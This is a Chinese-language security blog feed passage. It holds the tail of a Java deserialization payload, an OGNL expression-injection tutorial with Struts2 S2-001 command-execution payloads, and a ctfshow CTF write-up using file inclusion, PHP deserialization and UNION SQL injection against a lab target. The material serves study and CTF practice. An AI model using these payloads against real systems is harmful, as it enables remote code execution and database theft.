H4ABAAtAC4AAQAAAIMALwAwAAAAMQAAABAAAv8AfQABBwAyAAEHADMEAAEANAA1AAIAIAAAAD8AAAADAAAAAbEAAAACACEAAAAGAAEAAAAeACIAAAAgAAMAAAABAC8AMAAAAAAAAQA2ADcAAQAAAAEAOAA5AAIAOgAAAAQAAQA7AAEANAA8AAIAIAAAAEkAAAAEAAAAAbEAAAACACEAAAAGAAEAAAAjACIAAAAqAAQAAAABAC8AMAAAAAAAAQA2ADcAAQAAAAEAPQA+AAIAAAABAD8AQAADADoAAAAEAAEAOwABAEEAAAACAEI=&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123;&#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>传入并控制<code>Cmd</code>参数为命令：</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>ognl</title>
    <url>/2024/04/08/ognl/</url>
    <content><![CDATA[<p> ognl 表达式注入</p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>java 漏洞</p>
<p>RCE出现的原因和场景很多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务端直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">服务端不直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、JST+EL等</span><br><span class="line"></span><br><span class="line">由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line"></span><br><span class="line">由java一些脚本语言引起的 RCE 漏洞，常见的如：Groovy、JavascriptEngine等</span><br><span class="line"></span><br><span class="line">由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic等</span><br></pre></td></tr></table></figure>

<p>审计的时候可以重点寻找：</p>
<ul>
<li>Runtime.exec()</li>
<li>Process</li>
<li>ProcessBuilder.start()</li>
</ul>
<p>OGNL 全称Object-Graph Navigation Language即对象导航图语言，一种功能强大的表达式语言</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存取对象的任意属性</span><br><span class="line">调用对象的方法</span><br><span class="line">遍历整个对象的结构图</span><br><span class="line">实现字段类型转化</span><br></pre></td></tr></table></figure>

<p>webwork2 和 Struts2.x 中使用 OGNL 代替原来的 EL 来做界面数据绑定（就是把textfield.hidden和对象层某个类的某个属性绑定在一起，修改和现实自动同步）Struts2框架因为滥用OGNL表达式，所以漏洞较多。</p>
<h1 id="OGNL表达式语法"><a href="#OGNL表达式语法" class="headerlink" title="OGNL表达式语法"></a>OGNL表达式语法</h1><p>OGNL getValue需要三元素：expression表达式、context上下文及root对象。那么什么是三元素：</p>
<p>expression表达式：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；<br>root根对象：OGNL的Root对象可以理解为OGNL的操作对象。当OGNL通过表达式规定了“干什么”以后，还需要指定对谁进行操作；<br>context上下文对象：context以MAP的结构、利用键值对关系来描述对象中的属性以及值，称之为OgnlContext，可以理解为对象运行的上下文环境，其实就是规定OGNL的操作在哪里</p>
<h2 id="符号的使用："><a href="#符号的使用：" class="headerlink" title="符号的使用："></a>符号的使用：</h2><p>OGNL表达式支持Java基本运算，所以运算符<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>、<code>%</code>等在OGNL都是支持的，另外还支持<code>in</code>、<code>eq</code>、<code>gt</code>等。</p>
<p>%符</p>
<p><code>%</code>符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p>
<p>除了基本运算符，<code>.</code>、<code>@</code>、<code>#</code>在OGNL中都有特殊含义。</p>
<p>$符</p>
<p><code>$</code>符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）</p>
<p>1、通过<code>.</code>获取对象的属性或方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">student</span><br><span class="line">student.name</span><br><span class="line">student.school</span><br><span class="line">student.school.name</span><br><span class="line">student.takingClasses(&quot;英语&quot;)</span><br></pre></td></tr></table></figure>

<p>2、三种类型对象的获取：</p>
<p>静态对象、静态方法和静态变量：<code>@</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br><span class="line">@java.lang.Math@abs(-111)</span><br></pre></td></tr></table></figure>

<p><code>#</code>符主要有三种用途：</p>
<ul>
<li>访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于<code>ActionContext.getContext()</code>；</li>
<li>用于过滤和投影（projecting）集合，如<code>books.&#123;? #this.price&lt;100&#125;</code>；</li>
<li>用于构造Map，如<code>#&#123;&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;&#125;</code>；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#student.name</span><br><span class="line">#student.takingClasses(&quot;英语&quot;)</span><br></pre></td></tr></table></figure>



<h1 id="表达式注入漏洞"><a href="#表达式注入漏洞" class="headerlink" title="表达式注入漏洞"></a>表达式注入漏洞</h1><h2 id="ognl命令执行"><a href="#ognl命令执行" class="headerlink" title="ognl命令执行"></a>ognl命令执行</h2><p>导入 导入pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ognl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ognl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过上面表达式的学习我们很容易能够写出Java执行命令的表达式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建一个OGNL上下文对象</span></span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// getValue()   触发</span></span><br><span class="line">        <span class="comment">// @[类全名(包括包路径)]@[方法名|值名]</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&quot;</span>, context, context.getRoot());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// setValue()触发</span></span><br><span class="line"><span class="comment">//        Ognl.setValue(Runtime.getRuntime().exec(&quot;calc&quot;), context, context.getRoot());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用processbuilder执行系统命令</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br><span class="line"></span><br><span class="line">//获取当前路径</span><br><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br></pre></td></tr></table></figure>



<h2 id="命令执行-调用链子分析"><a href="#命令执行-调用链子分析" class="headerlink" title="命令执行 调用链子分析"></a>命令执行 调用链子分析</h2><p>[OGNL表达式注入漏洞总结 <a href="http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%92%8C-%E5%92%8C-%E7%9A%84%E5%8C%BA%E5%88%AB"> Mi1k7ea ]</a></p>
<h2 id="0x02-能解析OGNL的API"><a href="#0x02-能解析OGNL的API" class="headerlink" title="0x02 能解析OGNL的API"></a>0x02 能解析OGNL的API</h2><p>能解析OGNL的API如下表：</p>
<table>
<thead>
<tr>
<th align="left">类名</th>
<th align="left">方法名</th>
</tr>
</thead>
<tbody><tr>
<td align="left">com.opensymphony.xwork2.util.TextParseUtil</td>
<td align="left">translateVariables,translateVariablesCollection</td>
</tr>
<tr>
<td align="left">com.opensymphony.xwork2.util.TextParser</td>
<td align="left">evaluate</td>
</tr>
<tr>
<td align="left">com.opensymphony.xwork2.util.OgnlTextParser</td>
<td align="left">evaluate</td>
</tr>
<tr>
<td align="left">com.opensymphony.xwork2.ognl.OgnlUtil</td>
<td align="left">setProperties,setProperty,setValue,getValue,callMethod,compile</td>
</tr>
<tr>
<td align="left">org.apache.struts2.util.VelocityStrutsUtil</td>
<td align="left">evaluate</td>
</tr>
<tr>
<td align="left">org.apache.struts2.util.StrutsUtil</td>
<td align="left">isTrue,findString,findValue,getText,translateVariables,makeSelectList</td>
</tr>
<tr>
<td align="left">org.apache.struts2.views.jsp.ui.OgnlTool</td>
<td align="left">findValue</td>
</tr>
<tr>
<td align="left">com.opensymphony.xwork2.util.ValueStack</td>
<td align="left">findString,findValue,setValue,setParameter</td>
</tr>
<tr>
<td align="left">com.opensymphony.xwork2.ognl.OgnlValueStack</td>
<td align="left">findString,findValue,setValue,setParameter,trySetValue</td>
</tr>
<tr>
<td align="left">ognl.Ognl</td>
<td align="left">parseExpression,getValue,setValue</td>
</tr>
</tbody></table>
<p>以下是调用过程中可能会涉及到的一些类：</p>
<table>
<thead>
<tr>
<th align="left">涉及类名</th>
<th align="left">方法名</th>
</tr>
</thead>
<tbody><tr>
<td align="left">com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td>
<td align="left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td>
</tr>
<tr>
<td align="left">com.opensymphony.xwork2.util.reflection.ReflectionProvider</td>
<td align="left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td>
</tr>
</tbody></table>
<h1 id="struct2-001"><a href="#struct2-001" class="headerlink" title="struct2-001"></a>struct2-001</h1><p>影响版本: 2.0.0 - 2.0.8</p>
<p>payload 测试，然后返还2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;1+1&#125;</span><br></pre></td></tr></table></figure>



<p>payload ：如下</p>
<p>获取tomcat执行路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>获取Web路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line">#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#response.println(#req.getRealPath(&#x27;/&#x27;)),</span><br><span class="line">#response.flush(),</span><br><span class="line">#response.close()&#125;</span><br></pre></td></tr></table></figure>

<p>添加了一些换行符这样就方便读懂一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ognl-解析分析"><a href="#ognl-解析分析" class="headerlink" title="ognl 解析分析"></a>ognl 解析分析</h2><p>idea 远程调试</p>
<p>首先使用p 神的环境进行搭建 并部署的 </p>
<p>idea 动态调试</p>
<p><a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html">IDEA+docker，进行远程漏洞调试（weblogic） - ph4nt0mer - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/haonan_code/article/details/118335032">idea远程调试tomcat的war包项目_idea调试war-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/vuls/217482.html">Struts2基于OGNL的RCE漏洞全解析 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">java代码审计之常见漏洞学习 - Shu1L’s blog</a></p>
<p><a href="https://xz.aliyun.com/t/10482#toc-1">一文读懂OGNL漏洞 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://seaii-blog.com/2019/12/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019-12-29-Struts2%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">https://seaii-blog.com/2019/12/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019-12-29-Struts2%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/</a></p>
<p><a href="https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/">Java表达式注入之OGNL | 沉铝汤的破站 (chenlvtang.top)</a></p>
<p><a href="https://seaii-blog.com/2019/12/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019-12-29-Struts2%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">https://seaii-blog.com/2019/12/29/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019-12-29-Struts2%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/</a></p>
<p>[OGNL表达式注入漏洞总结 <a href="http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x01-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80"> Mi1k7ea ]</a></p>
<p><a href="https://www.cnblogs.com/suyu7/p/14918851.html">IDEA+docker，进行远程漏洞调试（weblogic） - 唐小风 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.anquanke.com/post/id/246100">Struts2-001 远程代码执行漏洞浅析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://blog.csdn.net/haonan_code/article/details/118335032">idea远程调试tomcat的war包项目_idea 调试tomcat-CSDN博客</a></p>
<p><a href="https://xz.aliyun.com/t/12814?time__1311=mqmhq+xfhD7YDs=Y4Cq4iTqxjhVf8feD&alichlgref=https://cn.bing.com/">Java漏洞调试—利用Vulhub一键进行docker远程调试 - 先知社区 (aliyun.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl%0ahttp</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow终极考核</title>
    <url>/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/</url>
    <content><![CDATA[<p> ctfshow终极考核</p>
 <span id="more"></span>

<p>在消息头中，发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_641=ctfshow&#123;affac61c787a82cc396585bea8ecf2dc&#125;</span><br></pre></td></tr></table></figure>

<p>查看源码，发现&#x2F;system36d&#x2F;，登录，查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/static/js/lock/index.js</span><br></pre></td></tr></table></figure>

<p>发现</p>
<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230529200549.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_644=ctfshow&#123;2bb9f2183f102f6f2aedbea4788f9f1d&#125;</span><br></pre></td></tr></table></figure>

<p>搜索发现</p>
<p>this.pin&#x3D;0x36D，登录</p>
<p>网络测试里命令执行抓包改为ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checklogin.php</span><br><span class="line">db</span><br><span class="line">index.php</span><br><span class="line">init.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">main.php</span><br><span class="line">secret.txt</span><br><span class="line">static</span><br><span class="line">update.php</span><br><span class="line">update2.php</span><br><span class="line">users.php</span><br><span class="line">util</span><br></pre></td></tr></table></figure>

<p>访secret.txt,url解码，即可看见</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_643=ctfshow&#123;616cd5fc37968fc20810b2db30152717&#125;</span><br></pre></td></tr></table></figure>

<p>点击数据备份，下载，打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;</span><br></pre></td></tr></table></figure>

<p>打开远程在线更新抓包，</p>
<p>远程文件包含，修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>发送解密如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>!==<span class="number">99</span> &amp;&amp; <span class="variable">$user</span>!==<span class="number">10</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;1;url=login.php\&quot;&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="string">&#x27;你还没有登陆,请先&lt;a href=&quot;login.php&quot;&gt;登陆&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:main.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- flag_642=ctfshow&#123;<span class="number">11</span>a17b6fbdc69cedfb374f55026700fe&#125; --&gt;</span><br></pre></td></tr></table></figure>

<p>，其他源码init.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PATH&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&#x27;/db/data_you_never_know.db&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG645&#x27;</span>,<span class="string">&#x27;flag645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG646&#x27;</span>,<span class="string">&#x27;flag646=ctfshow&#123;5526710eb3ed7b4742232d6d6f9ee3a9&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//存在漏洞，未修补前注释掉</span></span><br><span class="line"><span class="comment">//include &#x27;util/common.php&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>users.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch ($a) &#123;</span><br><span class="line">   case &#x27;evilString&#x27;:</span><br><span class="line">       evilString($_GET[&#x27;m&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilNumber&#x27;:</span><br><span class="line">       evilNumber($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilFunction&#x27;:</span><br><span class="line">       evilFunction($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilArray&#x27;:</span><br><span class="line">       evilArray($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilClass&#x27;:</span><br><span class="line">       evilClass($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function evilString($m)&#123;</span><br><span class="line">    $key = &#x27;372619038&#x27;;</span><br><span class="line">    $content = call_user_func($m);  //call_user_func — 把第一个参数作为回调函数调用</span><br><span class="line">    if(stripos($content, $key)!==FALSE)&#123;   //stripos() 函数查找字符串在另一字符串中第一次出现的位置</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not 372619038?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilClass($m,$k)&#123;</span><br><span class="line">    class ctfshow&#123;</span><br><span class="line">        public $m;</span><br><span class="line">        public function construct($m)&#123;</span><br><span class="line">            $this-&gt;$m=$m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ctfshow=new ctfshow($m);</span><br><span class="line">    $ctfshow-&gt;$m=$m;</span><br><span class="line">    if($ctfshow-&gt;$m==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG647&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG648&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;mmmmm?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilNumber($m,$k)&#123;</span><br><span class="line">    $number = getArray(1000,20,10,999);</span><br><span class="line">    if($number[$m]==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG648&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG649&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;number is right?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilFunction($m,$k)&#123;</span><br><span class="line">    $key = &#x27;ffffffff&#x27;;</span><br><span class="line">    $content = call_user_func($m);</span><br><span class="line">    if(stripos($content, $key)!==FALSE &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG649&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG650&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not ffffffff?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilArray($m,$k)&#123;</span><br><span class="line">    $arrays=unserialize($m);</span><br><span class="line">    if($arrays!==false)&#123;</span><br><span class="line">        if(array_key_exists(&#x27;username&#x27;, $arrays) &amp;&amp; in_array(&#x27;ctfshow&#x27;, get_object_vars($arrays)) &amp;&amp;  $k==shell_exec(&#x27;cat /FLAG/FLAG650&#x27;))&#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG651&#x27;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;array?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web647,返回值是个数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilString&amp;m=getallheaders</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>

<p>web648</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=evilClass&amp;m=1&amp;key=flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;</span><br></pre></td></tr></table></figure>

<p>web649,NULL绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=evilNumber&amp;m=&amp;key=flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>

<p>web650</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilFunction&amp;m=getenv&amp;key=flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>

<p>web651</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line">    public $ctfshow = 1;</span><br><span class="line">    public $username = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize(new ctfshow));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilArray&amp;m=O%3A7%3A&quot;ctfshow&quot;%3A2%3A&#123;s%3A7%3A&quot;ctfshow&quot;%3Bi%3A1%3Bs%3A8%3A&quot;username&quot;%3Bi%3A2%3B&#125;&amp;key=flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<p>web652</p>
<p>page.php 初注入，或者sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1) union select group_concat(schema_name) from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>

<p>返回：information_schema,test,mysql,performance_schema,ctfshow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1) union select group_concat(table_name) from information_schema.tables where table_schema=0x63746673686f77%23</span><br></pre></td></tr></table></figure>

<p>返回：ctfshow_keys,ctfshow_secret,ctfshow_users</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0) union select group_concat(column_name) from information_schema.columns where table_name=0x63746673686f775f736563726574%23</span><br></pre></td></tr></table></figure>

<p>返回：secret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page.php?id=0) union select secret from ctfshow_secret%23</span><br></pre></td></tr></table></figure>

<p>返回：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_652=ctfshow&#123;4b37ab4b6504d43ea0de9a688f0e3ffa&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;</span><br></pre></td></tr></table></figure>

<p>查看，key </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select `key` from ctfshow_keys%23</span><br></pre></td></tr></table></figure>

